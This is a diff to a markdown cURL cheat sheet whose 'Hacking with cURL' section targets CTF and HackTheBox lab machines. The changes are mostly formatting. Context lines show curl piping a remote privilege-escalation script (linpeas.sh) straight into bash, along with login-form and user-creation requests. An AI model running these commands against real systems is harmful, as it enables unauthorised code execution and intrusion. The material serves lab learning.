@@ -144,7 +144,7 @@ curl -b "PHPSESSID=vn0g4d94rs09rgpqga85r9bnia" http://10.10.10.10/home.php
 # Forms
 curl -F "firstname=John" -F "lastname=Doe" "https://httpbin.org/post"
 # With File upload
-curl -F "firstname=John" -F"lastname=Doe" "https://httpbin.org/post" -F"file=@file.txt"
+curl -F "firstname=John" -F "lastname=Doe" "https://httpbin.org/post" -F "file=@file.txt"
 # Upload a binary file with a mime type
 curl -F 'file=@photo.png;type=image/png' https://site.com/uploadf
 
@@ -159,29 +159,35 @@ curl https://httpbin.org/status/302  -w "%{response_code} %{redirect_url}" -s -o
 
 ```
 
+## Uploading
 
-# Hacking with cURL
+The proper way to upload files with CURL is to use **-F ( — form)** option, which will add **enctype=”multipart/form-data”** to the request.
+
+``$ curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS`
+
+
+## Hacking with cURL
 Now that we have covered the basic syntax and use cases, here are some practical hacking applications that are very helpful on Hackthebox or CTF boxes.
 
-## Using cURL to pipe a remote scipt (linpeas.sh) directly to bash:
+#### Using cURL to pipe a remote scipt (linpeas.sh) directly to bash:
 ```Bash
 $ curl -sSk "http://10.10.10.10/linpeas.sh" | bash
 ```
 
-## Attacking a Login Form with cURL
+#### Attacking a Login Form with cURL
 ```Bash
 $ curl --data "email=test@test.com&password=test" http://10.10.10.10/login.php
 ```
 
-## Creating new users with cURL
+#### Creating new users with cURL
 ```Bash
 $ curl --data "name=test&email=test@test.com&password=test" http://10.10.10.10/newuser.php
 ```
 
-# Fuzzing Web Servers with cURL
+#### Fuzzing Web Servers with cURL
 Often we performing an assessment against a webserver, we will attempt to trigger error conditions which will provide some deeper insights into the underlying processes and software. cURL can be a powerful fuzzing tool for generating these edge case error messages.
 
-## Fuzzing with URI length / GET parameter length limits with cURL
+#### Fuzzing with URI length / GET parameter length limits with cURL
 
 The following script can be used to fuzz a webserver with a long URL track the changes in output and write the output to a file.
 It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash.
@@ -223,7 +229,7 @@ Length Lines Words Bytes Filename
 100005 11  37 343 output.txt
 ```
 
-## Fuzzing POST parameter length limits with cURL
+#### Fuzzing POST parameter length limits with cURL
 
 The following script can be used to fuzz a webserver POST parameters and write the output to a file and track changes to that output.
 It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash.
@@ -260,7 +266,8 @@ Length Lines Words Bytes Filename
 100000 11  37 343 output.txt
 100001 11  37 343 output.txt
 ```
-## Check to see if a user login is correct in a Bash script
+
+#### Check to see if a user login is correct in a Bash script
 
 The following script can be used to verify that a username and login is correct.
 It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash.
@@ -283,7 +290,7 @@ $ ./check_user.sh http://10.10.10.10/login.php test@test.com testpassword
 NOT zero
 ```
 
-## Automate user creation and test for mysql_real_escape_string bypass
+#### Automate user creation and test for mysql_real_escape_string bypass
 The following is a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash.
 Here is a bash script I created for a CTF to validate a theory I had about its use of the PHP mysql_real_escape_string method:
 ```BASH
@@ -326,7 +333,7 @@ echo " DELETEING COOKIE "
 rm cookies.txt
 ```
 
-## Write out parameters
+#### Write out parameters
 
 From the [awesome-cheatsheets]((https://github.com/LeCoupa/awesome-cheatsheets/blob/master/tools/curl.sh)
 ```bash
